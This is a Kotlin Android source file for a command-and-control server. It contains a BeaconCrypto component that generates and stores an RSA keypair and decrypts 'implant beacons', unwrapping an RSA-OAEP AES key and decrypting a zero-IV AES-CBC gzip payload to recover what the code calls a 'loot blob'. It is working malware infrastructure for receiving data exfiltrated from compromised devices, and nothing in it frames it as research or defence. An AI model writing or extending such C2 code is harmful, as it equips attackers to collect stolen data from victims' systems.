package com.projectzerodays.quantumcli.c2

import android.util.Base64
import org.json.JSONObject
import java.io.ByteArrayInputStream
import java.io.File
import java.io.IOException
import java.security.KeyFactory
import java.security.KeyPair
import java.security.KeyPairGenerator
import java.security.PrivateKey
import java.security.PublicKey
import java.security.SecureRandom
import java.security.spec.PKCS8EncodedKeySpec
import java.security.spec.X509EncodedKeySpec
import java.util.zip.GZIPInputStream
import javax.crypto.Cipher
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.SecretKeySpec

/**
 * Beacon crypto parity with the Python C2 (keygen + decrypt_beacon):
 * implant beacons carry `k` (hex RSA-OAEP-SHA1 wrapped AES key) and `data`
 * (base64 AES-CBC zero-IV gzip payload). The RSA keypair is generated on
 * first server start and persisted under files/keys/.
 */
object BeaconCrypto {

    fun keysDir(): File = File(C2State.filesRoot, "keys")

    @Volatile
    private var cachedPair: KeyPair? = null

    fun ensureKeys(): KeyPair {
        cachedPair?.let { return it }
        synchronized(this) {
            cachedPair?.let { return it }
            val dir = keysDir()
            dir.mkdirs()
            val privFile = File(dir, "priv.key")
            val pubFile = File(dir, "pub.key")
            val pair: KeyPair = if (privFile.isFile && pubFile.isFile) {
                val kf = KeyFactory.getInstance("RSA")
                val priv = kf.generatePrivate(PKCS8EncodedKeySpec(privFile.readBytes()))
                val pub = kf.generatePublic(X509EncodedKeySpec(pubFile.readBytes()))
                KeyPair(pub, priv)
            } else {
                val gen = KeyPairGenerator.getInstance("RSA")
                gen.initialize(2048, SecureRandom())
                val fresh = gen.generateKeyPair()
                privFile.writeBytes(fresh.private.encoded)
                pubFile.writeBytes(fresh.public.encoded)
                fresh
            }
            cachedPair = pair
            return pair
        }
    }

    /** Python decrypt_beacon parity. Returns the decompressed loot blob or null. */
    fun decryptBeacon(d: JSONObject): ByteArray? {
        val kHex = d.optString("k")
        val dataB64 = d.optString("data")
        if (kHex.isBlank() || dataB64.isBlank()) return null
        return try {
            val priv = ensureKeys().private
            val rsa = Cipher.getInstance("RSA/ECB/OAEPWithSHA-1AndMGF1Padding")
            rsa.init(Cipher.DECRYPT_MODE, priv)
            val aesKey = rsa.doFinal(hexToBytes(kHex))

            val aes = Cipher.getInstance("AES/CBC/NoPadding")
            aes.init(
                Cipher.DECRYPT_MODE,
                SecretKeySpec(aesKey, "AES"),
                IvParameterSpec(ByteArray(16))
            )
            val padded = aes.doFinal(Base64.decode(dataB64, Base64.DEFAULT))
            if (padded.isEmpty()) return null
            val padLen = padded[padded.size - 1].toInt() and 0xFF
            val body = if (padLen in 1..16) {
                padded.copyOfRange(0, padded.size - padLen)
            } else {
                padded
            }
            gunzip(body)
        } catch (e: Exception) {
            null
        }
    }

    private fun gunzip(data: ByteArray): ByteArray? = try {
        GZIPInputStream(ByteArrayInputStream(data)).use { it.readBytes() }
    } catch (e: IOException) {
        null
    }

    private fun hexToBytes(hex: String): ByteArray {
        val clean = if (hex.length % 2 != 0) "0$hex" else hex
        val out = ByteArray(clean.length / 2)
        for (i in out.indices) {
            out[i] = clean.substring(i * 2, i * 2 + 2).toInt(16).toByte()
        }
        return out
    }
}
